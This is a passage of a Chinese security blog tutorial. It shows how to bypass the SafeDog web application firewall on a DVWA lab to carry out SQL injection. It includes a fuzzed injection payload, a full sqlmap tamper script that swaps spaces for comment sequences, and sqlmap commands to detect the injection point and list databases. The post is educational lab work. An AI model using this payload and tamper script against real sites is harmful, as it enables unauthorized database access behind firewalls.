+<p>但是如何进一步地利用 SQL 注入读取数据库敏感数据，还需要进一步 Fuzz 测试绕过安全狗对其他关键词的检测拦截（如 <code>union、order、select、database()、user()</code>等），篇幅所限，该部分留给读者自行解决！</p>
+<h1 id="SQLMap绕过"><a href="#SQLMap绕过" class="headerlink" title="SQLMap绕过"></a>SQLMap绕过</h1><p>对于上了网站安全狗的 DVWA 靶场，尝试使用 SQLMap 对上述 SQL 注入链接进行注入检测，结果可想而知，以失败告终：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041900570913.png" alt="在这里插入图片描述" loading="lazy">而在 SQLMap 执行的过程中，虚拟机中的安全狗记录了大量的攻击日志：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419005811216.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p>下面参考的是 Freebuf 的 Anubis24 大佬的文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/234487.html">技术讨论 | Fuzz绕过安全狗4.0实现SQL注入</a>，使用了 BurpSuite 的 intruder 模块进行 fuzz，并修改了 Sqlmap 工具的 tamper 脚本，对安全狗进行绕过。</p>
+<h2 id="Fuzz关键词"><a href="#Fuzz关键词" class="headerlink" title="Fuzz关键词"></a>Fuzz关键词</h2><p>1、如下图，测试<code>and</code>关键词，被安全狗拦截：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012029463.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p>2、把数据包放到 intuder 里面，进行 fuzz，看看哪一个字符能绕过安全狗，爆破点如下图：<br><img src="https://img-blog.csdnimg.cn/20210419012102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<p>3、字典选择 BurpSuite 自带的 <code>fuzzing-SQL injection</code>即可，设置如下图（ Github 上也有很多这种 Fuzz 字典）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012155190.png" alt="在这里插入图片描述" loading="lazy">4、开始 fuzz，如果有拦截就会是这样子：<br><img src="https://img-blog.csdnimg.cn/20210419012334776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>5、成功找到可以绕过安全狗拦截的 Payload：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012441696.png" alt="在这里插入图片描述" loading="lazy">6、将 Payload： <code>1&#39;/**/and/*//*/&#39;1&#39;=&#39;1</code>放入网页进行测试：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/202104190126441.png" alt="在这里插入图片描述" loading="lazy"><br>7、改为<code>1&#39;/**/and/*//*/&#39;1&#39;=&#39;2</code>则查无数据，说明 Payload 已绕过安全狗并有效注入到数据库：<br><img src="https://img-blog.csdnimg.cn/20210419012731155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="tamper绕过"><a href="#tamper绕过" class="headerlink" title="tamper绕过"></a>tamper绕过</h2><p>SQLMap 在默认情况下除了使用<code>CHAR()</code>函数防止出现单引号，没有对注入的数据进行修改，读者还可以使用 <code>--tamper</code>参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，命令如下所示：</p>
+<pre class="language-python" data-language="python"><code class="language-python">sqlmap<span class="token punctuation">.</span>py XXXXX <span class="token operator">-</span><span class="token operator">-</span>tamper <span class="token string">"模块名"</span></code></pre>
+
+<p>关于 tamper 脚本的用法，读者可参考博文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Drifter_Galaxy/article/details/108435339">SQLMap绕过脚本tamper（from 《Web安全攻防渗透测试实战指南》）</a>。</p>
+<p>在本地 SQLMap 的 tamper 文件夹下新建文件<code>test.py</code>，将 SQLMap 测试过程中的空格自动替换为<code>/*//*/</code>，如下所示:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python2</span>
+
+<span class="token triple-quoted-string string">"""
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""</span>
+
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
+
+__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW
+
+<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+
+<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Replaces space character (' ') with comments '/**/'
+
+    Tested against:
+        * Microsoft SQL Server 2005
+        * MySQL 4, 5.0 and 5.5
+        * Oracle 10g
+        * PostgreSQL 8.3, 8.4, 9.0
+
+    Notes:
+        * Useful to bypass weak and bespoke web application firewalls
+
+    >>> tamper('SELECT id FROM users')
+    'SELECT/**/id/**/FROM/**/users'
+    """</span>
+
+    retVal <span class="token operator">=</span> payload
+
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        retVal <span class="token operator">=</span> <span class="token string">""</span>
+        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
+                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
+                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>
+                    <span class="token keyword">continue</span>
+
+            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
+                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote
+
+            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
+                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote
+
+            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
+                retVal <span class="token operator">+=</span> <span class="token string">"/*//*/"</span>
+                <span class="token keyword">continue</span>
+
+            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+    <span class="token keyword">return</span> retVal</code></pre>
+<p>执行命令<code>sqlmap.py -r 123.txt --tamper=test.py</code>进行注入测试，SQLMap 即可绕过安全狗成功检测出注入点：<img src="https://img-blog.csdnimg.cn/20210419014323218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" loading="lazy">但是进一步尝试使用<code>sqlmap.py -r 123.txt --tamper=test.py --dbs</code>注入读取数据库数据时失败，还需要 Fuzz 其他关键词并修改 tamper 才行！<br><img src="https://img-blog.csdnimg.cn/20210419014708555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文演示了 DVWA 靶场搭建、网站安全狗的部署、Fuzz脚本绕过安全狗、BurpSuite 用于 Fuzz、Sqlmap 修改 tamper 绕过安全狗等，在实战过程中，还经常会遇到 WAF 对于异常流量过多的源主机 IP 进行封锁，导致 SQLMap 无法正常使用，后面将继续学习如何使用 IP 代理池配合 SQLMap 进行 WAF 的绕过测试，同时也会进一步学习 SQLMap tamper 的修改场景和应用！ </p>
+<p>本文参考以下文章：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a>；</li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1601226">对某狗的FUZZ测试</a>；</li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/234487.html">技术讨论 | Fuzz绕过安全狗4.0实现SQL注入</a>。</li>
+</ol>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Tr0e</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://tr0e.github.io/Python%E6%94%BB%E9%98%B2-Fuzz%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/" title="Python攻防-Fuzz绕过安全狗进行SQL注入">https://tr0e.github.io/Python%E6%94%BB%E9%98%B2-Fuzz%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/%E5%9F%BA%E4%BA%8EFRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%94%BB%E5%87%BB/" rel="prev" title="基于FRP反向代理工具实现内网穿透攻击"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">基于FRP反向代理工具实现内网穿透攻击</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D/" rel="next" title="记一次逆向破解微信小程序参数签名"><span class="post-nav-text">记一次逆向破解微信小程序参数签名</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Tr0e</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.2</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.4</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>
